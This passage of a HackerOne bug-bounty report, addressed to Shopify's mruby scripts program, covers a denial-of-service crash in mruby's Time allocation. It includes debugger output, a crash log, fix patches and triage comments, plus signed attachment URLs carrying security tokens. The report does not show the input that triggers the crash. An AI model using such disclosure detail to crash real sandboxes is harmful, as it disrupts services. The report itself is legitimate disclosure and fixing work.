0x7fff95b53a6c \u0026lt;+5737\u0026gt;: movl   %r14d, %r13d\n(lldb) up\nframe #2: 0x00007fff95b7c6c9 libsystem_c.dylib`__v2printf + 669\nlibsystem_c.dylib`__v2printf:\n    0x7fff95b7c6c9 \u0026lt;+669\u0026gt;: movl   %eax, %ebx\n    0x7fff95b7c6cb \u0026lt;+671\u0026gt;: jmp    0x7fff95b7c718            ; \u0026lt;+748\u0026gt;\n    0x7fff95b7c6cd \u0026lt;+673\u0026gt;: callq  0x7fff95b91fe4            ; symbol stub for: __error\n    0x7fff95b7c6d2 \u0026lt;+678\u0026gt;: movl   (%rax), %ebx\n(lldb) up\nframe #3: 0x00007fff95b60915 libsystem_c.dylib`_vsnprintf + 596\nlibsystem_c.dylib`_vsnprintf:\n    0x7fff95b60915 \u0026lt;+596\u0026gt;: testq  %rbx, %rbx\n    0x7fff95b60918 \u0026lt;+599\u0026gt;: je     0x7fff95b60924            ; \u0026lt;+611\u0026gt;\n    0x7fff95b6091a \u0026lt;+601\u0026gt;: movq   -0x1e0(%rbp), %rcx\n    0x7fff95b60921 \u0026lt;+608\u0026gt;: movb   $0x0, (%rcx)\n(lldb) up\nframe #4: 0x00007fff95b609ca libsystem_c.dylib`vsnprintf + 80\nlibsystem_c.dylib`vsnprintf:\n    0x7fff95b609ca \u0026lt;+80\u0026gt;: addq   $0x10, %rsp\n    0x7fff95b609ce \u0026lt;+84\u0026gt;: popq   %rbx\n    0x7fff95b609cf \u0026lt;+85\u0026gt;: popq   %r12\n    0x7fff95b609d1 \u0026lt;+87\u0026gt;: popq   %r14\n(lldb) up\nframe #5: 0x00007fff95b91d08 libsystem_c.dylib`__snprintf_chk + 128\nlibsystem_c.dylib`__snprintf_chk:\n    0x7fff95b91d08 \u0026lt;+128\u0026gt;: cmpq   -0x10(%rbp), %rbx\n    0x7fff95b91d0c \u0026lt;+132\u0026gt;: jne    0x7fff95b91d1d            ; \u0026lt;+149\u0026gt;\n    0x7fff95b91d0e \u0026lt;+134\u0026gt;: addq   $0xd8, %rsp\n    0x7fff95b91d15 \u0026lt;+141\u0026gt;: popq   %rbx\n(lldb)\nframe #6: 0x000000010004e8da mruby`mrb_time_asctime(mrb=0x00000001002029f0, self=mrb_value @ 0x00007fff5fbfc530) + 282 at time.c:506\n   503\n   504    tm = DATA_GET_PTR(mrb, self, \u0026amp;mrb_time_type, struct mrb_time);\n   505    d = \u0026amp;tm-\u0026gt;datetime;\n-\u0026gt; 506    len = snprintf(buf, sizeof(buf), \u0026quot;%s %s %02d %02d:%02d:%02d %s%d\u0026quot;,\n   507      wday_names[d-\u0026gt;tm_wday], mon_names[d-\u0026gt;tm_mon], d-\u0026gt;tm_mday,\n   508      d-\u0026gt;tm_hour, d-\u0026gt;tm_min, d-\u0026gt;tm_sec,\n   509      tm-\u0026gt;timezone == MRB_TIMEZONE_UTC ? \u0026quot;UTC \u0026quot; : \u0026quot;\u0026quot;,\n(lldb) p *tm\n(mrb_time) $0 = {\n  sec = -936748721012153088\n  usec = 105092\n  timezone = MRB_TIMEZONE_LOCAL\n  datetime = {\n    tm_sec = 12\n    tm_min = 5\n    tm_hour = 16\n    tm_mday = 1\n    tm_mon = 6484120\n    tm_year = 1\n    tm_wday = 0\n    tm_yday = 1\n    tm_isdst = 0\n    tm_gmtoff = 1701667182\n    tm_zone = 0x000a000000000000 \u0026lt;no value available\u0026gt;\n  }\n}\n(lldb) p *d\n(tm) $1 = {\n  tm_sec = 12\n  tm_min = 5\n  tm_hour = 16\n  tm_mday = 1\n  tm_mon = 6484120\n  tm_year = 1\n  tm_wday = 0\n  tm_yday = 1\n  tm_isdst = 0\n  tm_gmtoff = 1701667182\n  tm_zone = 0x000a000000000000 \u0026lt;no value available\u0026gt;\n}\n(lldb) q\nQuitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePatch to fix would be this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/mrbgems/mruby-time/src/time.c b/mrbgems/mruby-time/src/time.c\nindex dfd4450..5dc5b34 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/mrbgems/mruby-time/src/time.c\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/mrbgems/mruby-time/src/time.c\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -238,7 +238,9 @@\u003c/span\u003e time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)\n     tm-\u0026gt;usec -= 1000000;\n   }\n   tm-\u0026gt;timezone = timezone;\n\u003cspan class=\"gd\"\u003e-  mrb_time_update_datetime(tm);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  if (!mrb_time_update_datetime(tm)) {\n+    mrb_raisef(mrb, E_ARGUMENT_ERROR, \u0026quot;%S out of Time range\u0026quot;, mrb_float_value(mrb, sec));\n+  }\n\u003c/span\u003e\n   return tm;\n }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhich now returns:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ./mruby/bin/mruby crash.rb\n        [0] crash.rb:1\ncrash.rb:1: -9.3674872101215e+17 out of Time range (ArgumentError)\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAlso affected \u003ccode\u003emruby-engine\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ./bin/sandbox crash.rb\n./bin/sandbox:20: [BUG] Segmentation fault at 0x0000014531cca0\nruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]\n\n-- Crash Report log information --------------------------------------------\n   See Crash Report log file under the one of following:\n     * ~/Library/Logs/CrashReporter\n     * /Library/Logs/CrashReporter\n     * ~/Library/Logs/DiagnosticReports\n     * /Library/Logs/DiagnosticReports\n   for more details.\nDon\u0026#39;t forget to include the above Crash Report log file in bug reports.\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0011 e:000010 CFUNC  :sandbox_eval\nc:0002 p:0214 s:0006 E:000c80 EVAL   ./bin/sandbox:20 [FINISH]\nc:0001 p:0000 s:0002 E:001810 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\n./bin/sandbox:20:in `\u0026lt;main\u0026gt;\u0026#39;\n./bin/sandbox:20:in `sandbox_eval\u0026#39;\n\n-- Machine register context ------------------------------------------------\n rax: 0x00000000ffffffff rbx: 0x00000000ffffffff rcx: 0x000000014531cca0\n rdx: 0x000000014531cca0 rdi: 0x000000014531cca0 rsi: 0x00007fff95b52eb9\n rbp: 0x00007fff528d0400 rsp: 0x00007fff528d0400  r8: 0x0000000000000003\n  r9: 0x000000010dd2a24a r10: 0x00007fffa10cd401 r11: 0x00007ffe44bac7b4\n r12: 0x000000010dd2a24c r13: 0x0000000000000073 r14: 0x0000000000000073\n r15: 0x0000000000000003 rip: 0x00007fff95b0e152 rfl: 0x0000000000010206\n\n-- C level backtrace information -------------------------------------------\n0   ruby                                0x000000010d4cb5d4 rb_vm_bugreport + 388\n1   ruby                                0x000000010d36d023 rb_bug_context + 483\n2   ruby                                0x000000010d440653 sigsegv + 83\n3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26\n4   libsystem_c.dylib                   0x00007fff95b0e152 strlen + 18\n5   ???                                 0x00007fff528d07f0 0x0 + 140734578362352\n\n-- Other runtime information -----------------------------------------------\n\n* Loaded script: ./bin/sandbox\n\n* Loaded features:\n\n    0 enumerator.so\n    1 thread.rb\n    2 rational.so\n    3 complex.so\n\u0026lt;snip various gems\u0026gt;\n  185 /Users/\u0026lt;snip\u0026gt;/mruby-engine/lib/mruby_engine/mruby_engine.bundle\n  186 /Users/\u0026lt;snip\u0026gt;/mruby-engine/lib/mruby_engine.rb\n\n[NOTE]\nYou may have encountered a bug in the Ruby interpreter or extension libraries.\nBug reports are welcome.\nFor details: http://www.ruby-lang.org/bugreport.html\n\nAbort trap: 6\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePatch to fix \u003ccode\u003emruby-engine\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/ext/mruby_engine/mruby-time/src/time.c b/ext/mruby_engine/mruby-time/src/time.c\nindex 8884a5d..2b5d770 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/ext/mruby_engine/mruby-time/src/time.c\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/ext/mruby_engine/mruby-time/src/time.c\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -236,7 +236,9 @@\u003c/span\u003e time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)\n     tm-\u0026gt;usec -= 1000000;\n   }\n   tm-\u0026gt;timezone = timezone;\n\u003cspan class=\"gd\"\u003e-  mrb_time_update_datetime(tm);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  if (!mrb_time_update_datetime(tm)) {\n+    mrb_raisef(mrb, E_ARGUMENT_ERROR, \u0026quot;%S out of Time range\u0026quot;, mrb_float_value(mrb, sec));\n+  }\n\u003c/span\u003e\n   return tm;\n }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow returns:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ./bin/sandbox crash.rb\n./bin/sandbox:20:in `sandbox_eval\u0026#39;: -9.3674872249306e+17 out of Time range (MRubyEngine::EngineRuntimeError)\n        from ./bin/sandbox:20:in `\u0026lt;main\u0026gt;\u0026#39;\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003eHugh\u003c/p\u003e\n","bounty_amount":"10000.0","formatted_bounty":"$10,000","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-01-16T20:11:31.968Z","allow_singular_disclosure_after":-124619813.52958348,"singular_disclosure_allowed":true,"vote_count":12,"voters":["madrobot","eveeez","apapedulimu","c1231665","japz","spetr0x","prem1807","abhisheksingh","xcom","icheernoom","and 2 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1340503,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Crash file and patches.\n\n","markdown_message":"\u003cp\u003eCrash file and patches.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-05T04:04:03.301Z","updated_at":"2016-12-05T04:04:03.301Z","actor":{"username":"haquaman","cleared":false,"url":"/haquaman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/646/07cbfc394d4d3432eb95cf9735f225ea803090bb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":140443,"filename":"crash-188326.rb","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/140/443/9ae9b6e5ab9cb1275b1931b6b62aa9daa768bfe9/crash-188326.rb?response-content-disposition=attachment%3B%20filename%3D%22crash-188326.rb%22%3B%20filename%2A%3DUTF-8%27%27crash-188326.rb\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQ3JOVT23%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044825Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDGEmjMTZ%2B42U2ElKiFSRskfZ1wrVxF3tJ06TkMfcLk%2BAIhAMGEXUlLYHTI0tAfR14Q%2FlbZC6jasvfWZ1Xvj9WBrncpKrQDCFQQARoMMDEzNjE5Mjc0ODQ5Igw6Q27Zk4E2mhDIkK8qkQPD1saJxXJo5xzxC7fVYphiJ%2FxHiEAzAjpGAFbHRlj%2BLiBOmG4tQrsbkV%2BDoy35glVt3VI4PcrRoSV3Xl1l2IyyQg6MAvyC%2B8CnOcg10paQiOuIHqxgrORAtjeCM%2FYa%2B%2BhAC4ClNmzdap6B2rWS%2F5pSIBQv%2BEJ5ucGFGOTOhXwDWPOSwVcIjzZi84aBE8Q2Hp%2BMcECHk0MbOLdR6WMmv%2FUH8heXLI%2BruPp6jAdckhYnExze4vjNqLiF853%2FmOAZ5%2FOF%2FB5R7aky5RNPYUiVdcetKmZ6CT%2B07x3wuqCsncR%2F%2BTa7XXSwQmbv%2FX%2F9LJxuBI9m0amzD05qIaRW9JKLR141b8CMY2e8IRGQISPrCt8Qh5AMM6fBDRcYJy19FGv%2Fv76UtJCnBJ9PDHa9DBiX%2Fm7g1ESwgfanKtnd8zVHYVJNVHwEJnaoA42S8gvj9JC8LbG6wW26X%2BGNIqUhCEZdmyzvQW2TxPY5KZHKefNcp621V3psHl4EI4JPhLtsnkaIb%2BK%2FHnzGjxkH7LTYIIoehDsj1DDXsar%2FBTrqAZr%2BI5%2FjDHc%2BPm55e0u5NdPaVZOQUI4mihO6GyfNoTk4dhmqme4qPT3EW3BV4aHaQwUCpH7IKAahTGv%2BlphI%2BkZviJVM18LY2g08mzaHz81AkWCD12%2FMNsYVQR7cjgwdn0%2Bs0xVGfGhfh4MDAMmQGFe6Lif0OLiPqZvpzOsdc1U0fJguBGd%2BVFGpJYBzj3%2BaBj2VN%2BNGHLroYmrfeUAYC7jfMjbFHPWEIsnVV2UXlaBwn%2B77XmvArdijvUwKRP3s4EsxI3DWFehzXa7Gecsk2tMmt0kOjrYXTNt%2FN7x42KhOrVyhtMBIfepkwg%3D%3D\u0026X-Amz-Signature=a64ae10c23b92c6cdf10b2fc62b6b161b554fbad6183d06590082bc2041b6b7b"},{"id":140442,"filename":"bug-188326-mruby-engine.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/140/442/1bdbb24b910cf9dfcce266586da1e7b64df25a7a/bug-188326-mruby-engine.patch?response-content-disposition=attachment%3B%20filename%3D%22bug-188326-mruby-engine.patch%22%3B%20filename%2A%3DUTF-8%27%27bug-188326-mruby-engine.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQ3JOVT23%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044825Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDGEmjMTZ%2B42U2ElKiFSRskfZ1wrVxF3tJ06TkMfcLk%2BAIhAMGEXUlLYHTI0tAfR14Q%2FlbZC6jasvfWZ1Xvj9WBrncpKrQDCFQQARoMMDEzNjE5Mjc0ODQ5Igw6Q27Zk4E2mhDIkK8qkQPD1saJxXJo5xzxC7fVYphiJ%2FxHiEAzAjpGAFbHRlj%2BLiBOmG4tQrsbkV%2BDoy35glVt3VI4PcrRoSV3Xl1l2IyyQg6MAvyC%2B8CnOcg10paQiOuIHqxgrORAtjeCM%2FYa%2B%2BhAC4ClNmzdap6B2rWS%2F5pSIBQv%2BEJ5ucGFGOTOhXwDWPOSwVcIjzZi84aBE8Q2Hp%2BMcECHk0MbOLdR6WMmv%2FUH8heXLI%2BruPp6jAdckhYnExze4vjNqLiF853%2FmOAZ5%2FOF%2FB5R7aky5RNPYUiVdcetKmZ6CT%2B07x3wuqCsncR%2F%2BTa7XXSwQmbv%2FX%2F9LJxuBI9m0amzD05qIaRW9JKLR141b8CMY2e8IRGQISPrCt8Qh5AMM6fBDRcYJy19FGv%2Fv76UtJCnBJ9PDHa9DBiX%2Fm7g1ESwgfanKtnd8zVHYVJNVHwEJnaoA42S8gvj9JC8LbG6wW26X%2BGNIqUhCEZdmyzvQW2TxPY5KZHKefNcp621V3psHl4EI4JPhLtsnkaIb%2BK%2FHnzGjxkH7LTYIIoehDsj1DDXsar%2FBTrqAZr%2BI5%2FjDHc%2BPm55e0u5NdPaVZOQUI4mihO6GyfNoTk4dhmqme4qPT3EW3BV4aHaQwUCpH7IKAahTGv%2BlphI%2BkZviJVM18LY2g08mzaHz81AkWCD12%2FMNsYVQR7cjgwdn0%2Bs0xVGfGhfh4MDAMmQGFe6Lif0OLiPqZvpzOsdc1U0fJguBGd%2BVFGpJYBzj3%2BaBj2VN%2BNGHLroYmrfeUAYC7jfMjbFHPWEIsnVV2UXlaBwn%2B77XmvArdijvUwKRP3s4EsxI3DWFehzXa7Gecsk2tMmt0kOjrYXTNt%2FN7x42KhOrVyhtMBIfepkwg%3D%3D\u0026X-Amz-Signature=a4333700b91fee4e6fdafe9051497065433cd1b2afe391b668d10bce787b9d13"},{"id":140441,"filename":"bug-188326-mruby.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/140/441/6a0e86c93ac47215deca9441d5e364dce805188f/bug-188326-mruby.patch?response-content-disposition=attachment%3B%20filename%3D%22bug-188326-mruby.patch%22%3B%20filename%2A%3DUTF-8%27%27bug-188326-mruby.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQ3JOVT23%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044825Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDGEmjMTZ%2B42U2ElKiFSRskfZ1wrVxF3tJ06TkMfcLk%2BAIhAMGEXUlLYHTI0tAfR14Q%2FlbZC6jasvfWZ1Xvj9WBrncpKrQDCFQQARoMMDEzNjE5Mjc0ODQ5Igw6Q27Zk4E2mhDIkK8qkQPD1saJxXJo5xzxC7fVYphiJ%2FxHiEAzAjpGAFbHRlj%2BLiBOmG4tQrsbkV%2BDoy35glVt3VI4PcrRoSV3Xl1l2IyyQg6MAvyC%2B8CnOcg10paQiOuIHqxgrORAtjeCM%2FYa%2B%2BhAC4ClNmzdap6B2rWS%2F5pSIBQv%2BEJ5ucGFGOTOhXwDWPOSwVcIjzZi84aBE8Q2Hp%2BMcECHk0MbOLdR6WMmv%2FUH8heXLI%2BruPp6jAdckhYnExze4vjNqLiF853%2FmOAZ5%2FOF%2FB5R7aky5RNPYUiVdcetKmZ6CT%2B07x3wuqCsncR%2F%2BTa7XXSwQmbv%2FX%2F9LJxuBI9m0amzD05qIaRW9JKLR141b8CMY2e8IRGQISPrCt8Qh5AMM6fBDRcYJy19FGv%2Fv76UtJCnBJ9PDHa9DBiX%2Fm7g1ESwgfanKtnd8zVHYVJNVHwEJnaoA42S8gvj9JC8LbG6wW26X%2BGNIqUhCEZdmyzvQW2TxPY5KZHKefNcp621V3psHl4EI4JPhLtsnkaIb%2BK%2FHnzGjxkH7LTYIIoehDsj1DDXsar%2FBTrqAZr%2BI5%2FjDHc%2BPm55e0u5NdPaVZOQUI4mihO6GyfNoTk4dhmqme4qPT3EW3BV4aHaQwUCpH7IKAahTGv%2BlphI%2BkZviJVM18LY2g08mzaHz81AkWCD12%2FMNsYVQR7cjgwdn0%2Bs0xVGfGhfh4MDAMmQGFe6Lif0OLiPqZvpzOsdc1U0fJguBGd%2BVFGpJYBzj3%2BaBj2VN%2BNGHLroYmrfeUAYC7jfMjbFHPWEIsnVV2UXlaBwn%2B77XmvArdijvUwKRP3s4EsxI3DWFehzXa7Gecsk2tMmt0kOjrYXTNt%2FN7x42KhOrVyhtMBIfepkwg%3D%3D\u0026X-Amz-Signature=acc0a85f2b38eee342b8d815fcf0e5ad98f1d3847a8a3328858ef81fd2f8c658"}],"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1341902,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue, and our engineering team is investigating.","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the issue, and our engineering team is investigating.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-05T17:45:36.634Z","updated_at":"2016-12-05T17:45:36.634Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1341911,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-05T17:47:27.981Z","updated_at":"2016-12-05T17:47:27.981Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":11707},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1348262,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just realised that my patch would give a memory leak as didn't free the allocated memory before the raisef.\n\nHere are the updated patches:\n\nmruby\n```\ndiff --git a/mrbgems/mruby-time/src/time.c b/mrbgems/mruby-time/src/time.c\nindex dfd4450..f742c83 100644\n--- a/mrbgems/mruby-time/src/time.c\n+++ b/mrbgems/mruby-time/src/time.c\n@@ -238,7 +238,11 @@ time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)\n     tm-\u003eusec -= 1000000;\n   }\n   tm-\u003etimezone = timezone;\n-  mrb_time_update_datetime(tm);\n+  if (!mrb_time_update_datetime(tm)) {\n+    mrb_free(mrb, tm);\n+    tm = NULL;\n+    mrb_raisef(mrb, E_ARGUMENT_ERROR, \"%S out of Time range\", mrb_float_value(mrb, sec));\n+  }\n \n   return tm;\n }\n```\n\nmruby-engine\n```\ndiff --git a/ext/mruby_engine/mruby-time/src/time.c b/ext/mruby_engine/mruby-time/src/time.c\nindex 8884a5d..69984f9 100644\n--- a/ext/mruby_engine/mruby-time/src/time.c\n+++ b/ext/mruby_engine/mruby-time/src/time.c\n@@ -236,7 +236,11 @@ time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)\n     tm-\u003eusec -= 1000000;\n   }\n   tm-\u003etimezone = timezone;\n-  mrb_time_update_datetime(tm);\n+  if (!mrb_time_update_datetime(tm)) {\n+    mrb_free(mrb, tm);\n+    tm = NULL;\n+    mrb_raisef(mrb, E_ARGUMENT_ERROR, \"%S out of Time range\", mrb_float_value(mrb, sec));\n+  }\n \n   return tm;\n }\n```\n\nAlso attached.","markdown_message":"\u003cp\u003eJust realised that my patch would give a memory leak as didn\u0026#39;t free the allocated memory before the raisef.\u003c/p\u003e\n\n\u003cp\u003eHere are the updated patches:\u003c/p\u003e\n\n\u003cp\u003emruby\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/mrbgems/mruby-time/src/time.c b/mrbgems/mruby-time/src/time.c\nindex dfd4450..f742c83 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/mrbgems/mruby-time/src/time.c\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/mrbgems/mruby-time/src/time.c\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -238,7 +238,11 @@\u003c/span\u003e time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)\n     tm-\u0026gt;usec -= 1000000;\n   }\n   tm-\u0026gt;timezone = timezone;\n\u003cspan class=\"gd\"\u003e-  mrb_time_update_datetime(tm);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  if (!mrb_time_update_datetime(tm)) {\n+    mrb_free(mrb, tm);\n+    tm = NULL;\n+    mrb_raisef(mrb, E_ARGUMENT_ERROR, \u0026quot;%S out of Time range\u0026quot;, mrb_float_value(mrb, sec));\n+  }\n\u003c/span\u003e\n   return tm;\n }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003emruby-engine\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/ext/mruby_engine/mruby-time/src/time.c b/ext/mruby_engine/mruby-time/src/time.c\nindex 8884a5d..69984f9 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/ext/mruby_engine/mruby-time/src/time.c\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/ext/mruby_engine/mruby-time/src/time.c\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -236,7 +236,11 @@\u003c/span\u003e time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)\n     tm-\u0026gt;usec -= 1000000;\n   }\n   tm-\u0026gt;timezone = timezone;\n\u003cspan class=\"gd\"\u003e-  mrb_time_update_datetime(tm);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  if (!mrb_time_update_datetime(tm)) {\n+    mrb_free(mrb, tm);\n+    tm = NULL;\n+    mrb_raisef(mrb, E_ARGUMENT_ERROR, \u0026quot;%S out of Time range\u0026quot;, mrb_float_value(mrb, sec));\n+  }\n\u003c/span\u003e\n   return tm;\n }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAlso attached.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-07T18:22:47.154Z","updated_at":"2016-12-07T18:22:47.154Z","actor":{"username":"haquaman","cleared":false,"url":"/haquaman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/646/07cbfc394d4d3432eb95cf9735f225ea803090bb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":141452,"filename":"bug-188326-mruby-free.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/141/452/9a2b2175369a2a0278e56b5a60278f90a6b91139/bug-188326-mruby-free.patch?response-content-disposition=attachment%3B%20filename%3D%22bug-188326-mruby-free.patch%22%3B%20filename%2A%3DUTF-8%27%27bug-188326-mruby-free.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQ3JOVT23%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044825Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDGEmjMTZ%2B42U2ElKiFSRskfZ1wrVxF3tJ06TkMfcLk%2BAIhAMGEXUlLYHTI0tAfR14Q%2FlbZC6jasvfWZ1Xvj9WBrncpKrQDCFQQARoMMDEzNjE5Mjc0ODQ5Igw6Q27Zk4E2mhDIkK8qkQPD1saJxXJo5xzxC7fVYphiJ%2FxHiEAzAjpGAFbHRlj%2BLiBOmG4tQrsbkV%2BDoy35glVt3VI4PcrRoSV3Xl1l2IyyQg6MAvyC%2B8CnOcg10paQiOuIHqxgrORAtjeCM%2FYa%2B%2BhAC4ClNmzdap6B2rWS%2F5pSIBQv%2BEJ5ucGFGOTOhXwDWPOSwVcIjzZi84aBE8Q2Hp%2BMcECHk0MbOLdR6WMmv%2FUH8heXLI%2BruPp6jAdckhYnExze4vjNqLiF853%2FmOAZ5%2FOF%2FB5R7aky5RNPYUiVdcetKmZ6CT%2B07x3wuqCsncR%2F%2BTa7XXSwQmbv%2FX%2F9LJxuBI9m0amzD05qIaRW9JKLR141b8CMY2e8IRGQISPrCt8Qh5AMM6fBDRcYJy19FGv%2Fv76UtJCnBJ9PDHa9DBiX%2Fm7g1ESwgfanKtnd8zVHYVJNVHwEJnaoA42S8gvj9JC8LbG6wW26X%2BGNIqUhCEZdmyzvQW2TxPY5KZHKefNcp621V3psHl4EI4JPhLtsnkaIb%2BK%2FHnzGjxkH7LTYIIoehDsj1DDXsar%2FBTrqAZr%2BI5%2FjDHc%2BPm55e0u5NdPaVZOQUI4mihO6GyfNoTk4dhmqme4qPT3EW3BV4aHaQwUCpH7IKAahTGv%2BlphI%2BkZviJVM18LY2